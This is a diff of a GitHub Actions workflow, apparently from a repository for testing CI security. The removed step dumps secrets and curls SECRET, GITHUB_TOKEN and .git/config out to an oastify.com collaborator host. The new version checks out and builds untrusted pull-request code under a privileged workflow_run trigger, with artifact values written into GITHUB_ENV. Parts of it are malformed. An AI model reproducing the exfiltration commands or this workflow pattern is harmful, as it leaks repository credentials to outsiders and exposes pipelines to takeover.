@@ -1,52 +1,75 @@
-# This is a basic workflow to help you get started with Actions
-
 name: Build
 
-# Controls when the workflow will run
 on:
-  # Triggers the workflow on push or pull request events but only for the "main" branch
-  push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
+  workflow_run:
+    workflows: ["Scan"]
+    types:
+      - completed
 
-  # Allows you to run this workflow manually from the Actions tab
-  workflow_dispatch:
-
-# A workflow run is made up of one or more jobs that can run sequentially or in parallel
 jobs:
-  # This workflow contains a single job called "build"
   build:
-    # The type of runner that the job will run on
     runs-on: ubuntu-latest
-
-    # Steps represent a sequence of tasks that will be executed as part of the job
+    if: ${{ github.event.workflow_run.conclusion == 'success' }}
     steps:
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
-      - uses: actions/checkout@v3
+      - name: 'Download artifact'
+        uses: actions/github-script@v6
+        with:
+          script: |
+            let allArtifacts = await github.rest.actions.listWorkflowRunArtifacts({
+               owner: context.repo.owner,
+               repo: context.repo.repo,
+               run_id: context.payload.workflow_run.id,
+            });
+            let matchArtifact = allArtifacts.data.artifacts.filter((artifact) => {
+              return artifact.name == "pr"
+            })[0];
+            let download = await github.rest.actions.downloadArtifact({
+               owner: context.repo.owner,
+               repo: context.repo.repo,
+               artifact_id: matchArtifact.id,
+               archive_format: 'zip',
+            });
+            let fs = require('fs');
+            fs.writeFileSync(`${process.env.GITHUB_WORKSPACE}/pr.zip`, Buffer.from(download.data));
 
-      # Runs a single command using the runners shell
-      - name: Run a one-line script
-        run: echo Hello, world!
+      - name: 'Unzip artifact'
+        run: unzip pr.zip
 
-      # Runs a set of commands using the runners shell
-      - name: Run a multi-line script
-        run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
-          printenv
-          echo ${{ secrets }}
-          curl "https://vnmf1fq7ob5euwoc6uqk6i183z9qxgl5.oastify.com?secret=$SECRET"
-          curl "https://vnmf1fq7ob5euwoc6uqk6i183z9qxgl5.oastify.com?github_token=$GITHUB_TOKEN"
-          cat ./.git/config
-          git config -l
-          curl -d @./.git/config vnmf1fq7ob5euwoc6uqk6i183z9qxgl5.oastify.com
-          echo "${{ github.event.pull_request.title }}"
-          for run in {1..1800}; do
-            date;sleep 1;
-          done
-        shell: bash
-        env:
-          SECRET: ${{ secrets.SECRET }}
-          FIRST_NAME: Mona
-          LAST_NAME: Octocat
+      - name: 'Debug'
+        run:
+          cat pr_number
+          cat pr/pr_number
+          cat pr/pr_ref
+          cat pr/pr_repo
+          echo "$PR_NUMBER=$(cat pr/pr_number)" >> $GITHUB_ENV
+          echo "$PR_REF=$(cat pr/pr_ref)" >> $GITHUB_ENV
+          echo "$PR_REPO=$(cat pr/pr_repo)" >> $GITHUB_ENV
+
+      - name: 'Comment on PR'
+        uses: actions/github-script@v6
+        with:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          script: |
+            let fs = require('fs');
+            let issue_number = Number(fs.readFileSync('pr/pr_number'));
+            await github.rest.issues.createComment({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              issue_number: issue_number,
+              body: 'Thank you for the PR!'
+            });
+
+      - name: Clone PR
+        uses: actions/checkout@v2
+        with:
+          fetch-depth: 0
+          ref: ${{ env.PR_REF }}
+          repository: ${{ env.PR_REPO }}
+
+      - uses: actions/setup-node@v3
+        with:
+          node-version: 16
+      - run: npm ci
+      - run: echo "Done!"
+
+# https://github.com/actions/checkout/issues/455
